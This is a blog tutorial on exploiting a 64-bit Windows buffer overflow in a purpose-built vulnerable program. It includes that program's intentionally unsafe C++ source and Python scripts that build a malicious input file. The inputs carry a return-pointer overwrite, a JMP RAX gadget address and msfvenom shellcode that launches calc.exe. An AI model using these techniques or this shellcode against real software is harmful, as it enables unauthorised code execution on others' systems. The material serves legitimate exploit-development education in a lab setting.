---
layout: post
title: "Basics of Exploit Development 5: x86-64 Buffer Overflows"
permalink: "basics-of-exploit-development-5"
tags: Windows Exploit-Development 
author: Andy
---

# The Basics of Exploit Development 5: x86-64 Buffer Overflows

## Introduction

Hello, if you have read the other articles in this series welcome back, if not I would encourage you to read those before proceeding with this article as this article builds on concepts laid down in the previous installments. In this article we will be covering a technique similar to the one in the first installment of this series however with the twist in that this exploit will be of a 64 bit process running on windows 10. 

Due to the nature of modern operating systems and the exploit mitigation techniques they employ this will not be a very realistic example due to the fact that we will be disabling everything so we can concentrate on a few aspects of exploiting a 64 bit application. Specifically in this article we will be looking at the differences in how the different architectures call functions and how the features of the 64 bit method can be leveraged to exploit a vulnerability. 

## Setup

This guide was written to run on a fresh install of Windows 10 Pro and as such you should follow along inside a Windows 10 virtual machine. This vulnerability has also been tested on Windows 7 however the offsets in this article are the ones from the Windows 10 machine and subsequently may differ on your Windows 7 installation. The steps to recreate the exploit however are exactly the same.

We will need a copy of X64dbg which you can download from the [official website](https://x64dbg.com/#start) and a copy of the ERC plugin for X64dbg from [here](https://github.com/Andy53/ERC.Xdbg/releases). If you already have a copy of X64dbg and the ERC plugin installed running “ERC --Update” will download and install the latest 32bit and 64 bit plugins for you. As the vulnerable application we will be working with is a 32-bit application you will need to either download the 32-bit version of the plugin binaries or compile the plugin manually. Instructions for installing the plugin can be found on the [GitHub page](https://github.com/Andy53/ERC.Xdbg).

If using Windows 7 and  X64dbg with the plugin installed and it crashes and exits when starting you may need to install .Net Framework 4.7.2 which can be downloaded [here](https://support.microsoft.com/en-us/help/4054530/microsoft-net-framework-4-7-2-offline-installer-for-windows).

Finally, we will need a copy of the vulnerable application which can be found [here](https://github.com/Andy53/BufferOverflowExample/releases/download/1.0/BufferOverflowExample.exe). In order to confirm everything is working, start X64dbg and select File -> Open, then navigate to where you installed vulnerable app and select the executable. Click through the breakpoints and the terminal interface should pop up. Now in X64dbg’s terminal type: 

Alternatively, you have the option to build the project from source. A Visual Studio solution package can be found [here](https://github.com/Andy53/BufferOverflowExample/tree/1.0) however the code for the application is also below. Please be advised if you create your own solution and use the code below you will need to disable all the exploit mitigations on by default in Visual Studio.

```
#include <iostream>  
#include <string>  
#include <fstream>  
#include <windows.h>  
  
inline bool file_exists(const std::string& name) {  
    std::ifstream f(name.c_str());  
    return f.good();  
}  
	  
void exploitable(const char* p, int len)  
{  
    char buffer[700];  
    long unsigned int out_protect;  
    if (!VirtualProtect((void*)buffer, 700, PAGE_EXECUTE_READWRITE, &out_protect)) {  
        puts("Failed to mark buffer as executable");  
        exit(1);  
    }  
    memcpy(buffer, p, len);  
}  
  
int main()  
{  
    std::string inputFile = "";  
    std::string inputText = "";  
  
    std::cout << "Please enter filename:\n";  
    std::cin >> inputFile;  
  
    bool fileExists = file_exists(inputFile);  
  
    if (fileExists == true) {  
        std::ifstream t(inputFile);  
        std::string str((std::istreambuf_iterator<char>(t)),  
            std::istreambuf_iterator<char>());  
        inputText = str;  
    }  
    else{  
        std::cout << "File does not exist\n";  
        std::cin >> inputFile;  
        return 0;  
    }  
  
    exploitable(inputText.c_str(), inputText.size());  
    std::cin >> inputText;  
	  
    return 0;  
}
```

Now that you have a working copy of the vulnerable app, X64dbg and the ERC plugin, you can now start the debugger and attach to the vulnerable app and run the following command.

**Command:**
```
ERC --help
```

You should see the following output:
 
<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/Setup-Complete.PNG"/></p>    
<p align="center"><i>X64bgd open, running the ERC plugin and attached to vulnerable app.</i></p>

## Transitioning to x86-64

### Registers

Similarly to when `x86-16` was extended to `x86-32`, all the old registers remain the same size and have the same prefix. To access the 64 bit version of each register you replace the E prefix from 32 bit notation with an R. As can be seen in the image below there are also 8 new registers (`R8`-`R15`). There are also numerous other registers such as the 16 vector registers (`xmm0`-`xmm15`) however we will not be using these during this installment of the series.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/Register-table.png"/></p>    
<p align="center"><i>X86-64 registers.</i></p>

## Calling Convention

The calling convention for `x86-32` is for the most part cdecl or stdcall (primarily cdecl for most things and stdcall for the Windows API) however `x86-64` uses the fastcall calling convention in almost all instances.

Fastcall places the first 4 arguments passed to a function in registers `RCX`, `RDX` `R8` and `R9` further parameters are placed on the stack. The registers `RAX`, `RCX`, `RDX`, `R8`, `R9`, `R10` and `R11` are considered volatile registers meaning that their values will not be preserved through a function call however the values placed in `RBX`, `RBP`, `RDI`, `RSI`, `RSP`, `R12`, `R13`, `R14` and `R15` will be preserved through a function call.

Importantly for this article when a fastcall function returns a value it will be stored in `RAX` (the value itself will be stored if it is less than 8 bytes or a pointer to the value if it is greater than 8 bytes) as such if we can overwrite a functions return pointer with a pointer to a `JMP RAX` instruction we can jump to the location in memory of the value returned by that function.

## Overwriting RIP

In a 32-bit architecture application if a buffer is overflown in a suitable manner the `EIP` register will get loaded with the overwritten return pointer address on the stack. This is not the case with 64 bit applications, 64 bit applications will only load canonical addresses into the `RIP` register. As an example you can not overflow a buffer with A’s and expect to see `RIP` flooded with 41’s as `0x4141414141414141` is not a canonical address. We can however overwrite the return pointer with a canonical address of some instruction set we would like to execute, and this address will be loaded into RIP and run as normal. 

In the 64 bit architecture not all possible addresses are used for normal user land applications. Typically you can expect `0x0000000000000000` to `0x00007FFFFFFFFFFF` to be available to userland processes with kernel processes using the 0xFFFF0000'00000000 - 0xFFFFFFFF'FFFFFFFF range. Any address outside these ranges are non-canonical.

## Confirming the Vulnerability Exists

In order to confirm the vulnerability exists we will need to pass a malicious payload to the program that will cause a crash. As this program reads a file as input we will write 1000 A’s to a file using the python script below then pass it to the program.
```
f = open("crash-1.txt", "wb")  
  
buf = b"A" * 1000  
  
f.write(buf)  
f.close()  
```
First ensure the vulnerable app is still open and attached to x64dbg. Then when you run the program it will create a text file called “crash-1.txt” simply pass the path of this file to the vulnerable application and observe the crash in x64dbg. If we now look at the stack view we can see that the return pointer has been overwritten.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/Return_Pointer_Overwritten.PNG"/></p>    
<p align="center"><i>Return pointer overwritten with A’s.</i></p>

However looking at the registers view we can see that RIP has not been overwritten with A’s. This is due to the fact that RIP will not load a non-canonical address as discussed earlier in this article.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/RIP_not_overwritten.PNG"/></p>    
<p align="center"><i>RIP not filled with A’s from return pointer.</i></p>

Now that we have confirmed the vulnerability exists and appears to be exploitable we can continue developing this into a full exploit.

## Developing the Exploit

Now that we know we can overwrite the saved return pointer, we can start building a working exploit. As was the case in the previous episode of this series we will be using the ERC plugin for X64dbg. So let’s ensure we have all our files being generated in the correct place with the following commands.

**Command:**
```
ERC --config SetWorkingDirectory C:\Users\YourUserName\DirectoryYouWillBeWorkingFrom
```

If you are not using the same machine as last time you may want to reassign the project author.

**Command:**
```
ERC --config SetAuthor AuthorsName
```

Now that we have assigned our working directory and set an author for the project, the next task is to identify how far into our string of As that the return pointer was overwritten. To identify this, we will generate a non-repeating pattern (NRP) and include it in our next buffer.

**Command:**
```
ERC --pattern c 1000
```

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/pattern.PNG"/></p>    
<p align="center"><i>ERC Pattern Create output.</i></p>

We can add this into our exploit code, so it looks like the following:
```
f = open("crash-2.txt", "wb")  
  
buf = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"  
buf += b"9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"  
buf += b"Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"  
buf += b"i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"  
buf += b"7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"  
buf += b"Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5A"  
buf += b"r6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au"  
buf += b"5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4"  
buf += b"Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3B"  
buf += b"a4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd"  
buf += b"3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2"  
buf += b"Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"  
  
f.write(buf)  
f.close()  
```

Run the python program and pass the created file (crash-2.txt) to the application again. It should cause a crash. Run the following command to find out how far into the pattern the return pointer was overwritten. Due to the fact that RIP will not load a non-canonical address we will not be able to use the FindNRP command to identify where the return pointer was overwritten. As such we can copy the value out that the return pointer has been overwritten with and pass it to the pattern offset command.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/nrp_overwrite.PNG"/></p>    
<p align="center"><i>Return pointer overwritten with non-repeating pattern.</i></p>

The value `3978413878413778` seen in the image above converted to ascii is `9xA8xA7x` we can use this with the pattern offset command to identify how far into our input string the return pointer was overwritten.

**Command:**
ERC --pattern o 9xA8xA7x

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/Pattern_Offset.PNG"/></p>    
<p align="center"><i>Pattern offset identifying the location the return pointer was overwritten.</i></p>

Now that we have identified how far into our malicious input the return pointer was overwritten it is time to identify if `RAX` points to a useful section of memory. We can do this by right clicking the `RAX` register in x64dbg and selecting “Follow in Dump” which we can now see points to the start of our non-repeating pattern. 

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/RAX_Points_into_buffer.PNG"/></p>    
<p align="center"><i>RAX pointing to the start of the non-repeating pattern.</i></p>

Now that we know we can control `RIP` and we have a register that points into an area of memory we control all we need is a pointer to a `JMP RAX` instruction and execution will be diverted to the start of our malicious buffer. First let’s identify what hex codes correspond to `JMP RAX`.

**Command:**
```
ERC --assemble JMP RAX
```

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/assemble_jmp_rax.PNG"/></p>    
<p align="center"><i>JMP RAX hex code.</i></p>

Now let’s search the binaries loaded by the application for a suitable pointer to a `JMP RAX` instruction.

**Command:**
```
ERC --searchmemory FF E0
```

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/JMP_RAX_Pointers.PNG"/></p>    
<p align="center"><i>Suitable pointers to JMP RAX instructions.</i></p>

In this example we will be using `0x00000000007D6AF0`. As this is a canonical address we can put this at the point necessary to overwrite our return pointer and see if it gets loaded into `RIP`. Our exploit code should now look like this:
```
f = open("crash-3.txt", "wb")  
  
buf = b"\x90" * 712  
buf += b"\xF0\x6A\x7D\x00\x00\x00\x00\x00" #00000000007D6AF0  
buf += b"\x00" * 300  
  
f.write(buf)  
f.close()
```

We have also replaced our A’s with `NOP` instructions so we can pass through them without crashing the application when we land in our payload. You should also place a breakpoint at the `JMP RAX` instruction so we can see that we land there as expected.

When we pass this new malicious file to our vulnerable application we should see the following in the registers view.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/RIP_Overwritten.PNG"/></p>    
<p align="center"><i>RIP overwritten with JMP RAX pointer.</i></p>

`RIP` has now been overwritten with our `JMP RAX` pointer. This should also be confirmed by looking at the disassembler view we can see that we have hit our breakpoint.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/Landing-at-BP.PNG"/></p>    
<p align="center"><i>Landing at our JMP RAX breakpoint.</i></p>

Now if we single step with F7 we should see execution move to where `RAX` is pointing and land us in our `NOP` buffer.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/Landing-at-Nops.PNG"/></p>    
<p align="center"><i>Landing in NOP buffer.</i></p>

Now that we have redirected execution to a section of memory we control all we need to do is generate a payload, add it to our exploit and confirm it works. To do this we will once again turn to MSFVenom and generate a calc payload.

**Command:** 
```
msfvenom –p windows/x64/exec CMD=calc.exe -f python –smallest -b ‘\x1A’
```

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/MSFVenom.PNG"/></p>    
<p align="center"><i>MSFVenom payload generation.</i></p>

We can now add this to our exploit code to get the following:
```
f = open("crash-4.txt", "wb")  
  
buf =  b""  
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"  
buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"  
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"  
buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"  
buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"  
buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"  
buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"  
buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"  
buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"  
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"  
buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"  
buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"  
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"  
buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"  
buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"  
buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"  
buf += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"  
buf += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"  
buf += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"  
buf += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"  
buf += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"  
buf += b"\x78\x65\x00"  
buf += b"\x90" * (712 - len(buf))  
buf += b"\xF0\x6A\x7D\x00\x00\x00\x00\x00" #00000000007D6AF0  
buf += b"\x41" * 300  
	  
f.write(buf)  
f.close()
```

Which after passing to the vulnerable app and stepping through the breakpoint should cause the calculator to pop up.

<p align="center"><img src="/images/basics-of-exploit-development-5-x86-64-buffer-overflows/Exploit-Complete.PNG"/></p>    
<p align="center"><i>Exploit completed!</i></p>

We have now successfully completed a working exploit on a 64 bit application.

## Conclusion

Whilst this exercise was not the most realistic scenario it covered some essential techniques which we will build on in later articles to exploit applications in more realistic scenarios. Knowledge of the different function calling conventions is essential if you wish to develop exploits in any realistic situation or to write your own custom payloads and as such I hope you found value in this article.
